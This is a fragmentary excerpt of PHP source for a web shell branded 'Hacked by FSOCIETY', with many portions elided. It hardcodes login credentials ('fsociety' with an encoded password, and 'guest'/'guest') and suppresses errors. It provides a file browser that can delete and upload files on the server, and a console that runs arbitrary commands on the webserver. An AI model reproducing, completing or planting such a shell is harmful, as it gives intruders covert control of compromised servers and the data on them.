...
//user => password
$users = array('fsociety' => 'ZnNvY2lldHkyMjIzMjQyNXdXQCMkJSEK', 'guest' => 'guest');
...
#$http_auth_user = "phpshell";	
#$http_auth_pass = "phpshell";	

error_reporting(0);
$PHPVer=phpversion();
$isGoodver=(intval($PHPVer[0])>=4);
$scriptTitle = "Hacked";
$scriptident = "$scriptTitle by FSOCIETY";
...
if ( $cmd=="dir" ) {
    ...
    ?>
	  ...
	  <tr>
	   <td width="100%" class="silver border">
	    <center>&nbsp;EXPLORER - Server Files Browser...&nbsp;</center>
	   </td>
	  </tr>
	 </table>
       <br>
	...
	echo "<center><table><tr><td NOWRAP>" ;
 	if ($auth == "yes") {
		if (Mydeldir($file)==false) {
 		...
 		echo "<form action=\"$SFileName?$urlAdd\" method=\"POST\"><input type=\"hidden\" name=\"cmd\" value=\"$lastcmd\"><input type=\"hidden\" name=\"dir\" value=\"$lastdir\"><input tabindex=\"0\" type=\"submit\" value=\"Back to EXPLORER\"></form>";
	}
 	else {
	...
	echo "<center><table><tr><td NOWRAP>";
 	...
 	if ($file == false)
 		...
 		echo "
			...
			<input type=\"hidden\" name=\"cmd\" value=\"$lastcmd\">
			<input type=\"hidden\" name=\"dir\" value=\"$lastdir\">
			<input tabindex=\"0\" type=\"submit\" value=\"Back to EXPLORER\">
			</form></center>
 			</td></tr></table></center>   		";
	}
...
elseif ( $cmd=="uploadproc" ) { /* <!-- Process Uploaded file --> */
	...
	echo "<form action=\"$SFileName?$urlAdd\" method=\"POST\"><input type=\"hidden\" name=\"cmd\" value=\"$lastcmd\"><input type=\"hidden\" name=\"dir\" value=\"$lastdir\"><input tabindex=\"0\" type=\"submit\" value=\"Back to EXPLORER\"></form></center>" ;
...
?>
	...
	<textarea cols="80" rows="19" class="inputtextarea" wrap=off readonly><?php
	    if (!empty($command)) {
	        echo "CONSOLE> ". htmlspecialchars($command) . "\n\n"; 
		if ($stderr) {
...
<?php
	...
	<table border="0" NOWRAP>
	  ...
	  <td valign="top" class="silver border">
           <?php echo buildUrl( sp(2)."<font color=\"navy\"><strong>==> EXPLORER <==</strong></font>", "cmd=dir&dir=.").sp(2); ?>
	  </td>
 	  <td style="BORDER-TOP: silver 1px solid;" width=350 NOWRAP>
	   server side file browser wich (ab)uses the directory object to list
 	 ...
 	 <tr>
	  <td valign="top" class="silver border">
           <?php echo buildUrl( sp(2)."<font color=\"navy\"><strong>==> CONSOLE <==</strong></font>", "cmd=con").sp(2); ?>
	  </td>
 	  <td style="BORDER-TOP: silver 1px solid;" width=350 NOWRAP>
	   <br>just a little telnet like shell wich allows you to run commands on the webserver.
		 ...
		 <tr>
		  <td width="100%" style="class="silver border">
		   <center><strong>
		    ...
		    &nbsp;&nbsp;<?php echo buildUrl("<font color=\"navy\">[&nbsp;CONSOLE&nbsp;] </font>", "cmd=con");        ?>&nbsp;&nbsp;
                    &nbsp;&nbsp;<?php echo buildUrl("<font color=\"navy\">[&nbsp;EXPLORER&nbsp;]  </font>", "cmd=dir&dir=.");  ?> &nbsp;&nbsp;
 		   </strong></center>
		  </td>
		 </tr>
		</table>
